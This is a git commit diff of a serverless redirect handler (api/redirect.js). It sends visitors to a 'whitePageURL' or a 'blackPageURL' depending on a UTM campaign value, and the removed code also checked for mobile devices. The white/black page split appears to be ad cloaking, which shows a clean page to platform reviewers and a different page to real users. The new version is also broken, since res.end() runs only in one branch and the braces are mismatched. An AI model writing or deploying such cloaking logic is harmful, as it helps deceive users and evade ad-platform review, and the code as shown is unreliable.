86860b0aca0830dd67a80503c3f65e12f13e51cf
Ayden Xu <aydenxunc@gmail.com>
2025-01-04 18:13:05 -0500

    opeing

--- api/redirect.js
+++ api/redirect.js
@@ -7,22 +7,14 @@ export default function handler(req, res) {
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
     const utmCampaign = queryParams.get('utm_campaign');
   
-    // Get the User-Agent from the request headers
-    const userAgent = req.headers['user-agent'] || '';
-    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-  
-    // Redirection logic
-    if (utmCampaign && utmCampaign.length > 0) {
-      // UTM campaign 'l1' takes priority for both desktop and mobile
-      res.writeHead(302, { Location: whitePageURL });
-    } else if (isMobileDevice) {
-      // Mobile devices without 'l1' campaign
-      res.writeHead(302, { Location: blackPageURL });
-    } else {
-      // Desktop devices without 'l1' campaign
-      res.writeHead(302, { Location: whitePageURL });
-    }
-  
-    res.end();
-  }
+   // Redirection logic
+   if (utmCampaign === '__AID_NAME__') {
+    // UTM campaign 'l1' takes priority for both desktop and mobile
+    res.writeHead(302, { Location: whitePageURL });
+  } else{
+    // Mobile devices without 'l1' campaign
+    res.writeHead(302, { Location: blackPageURL });
+
+  res.end();
+}}
   
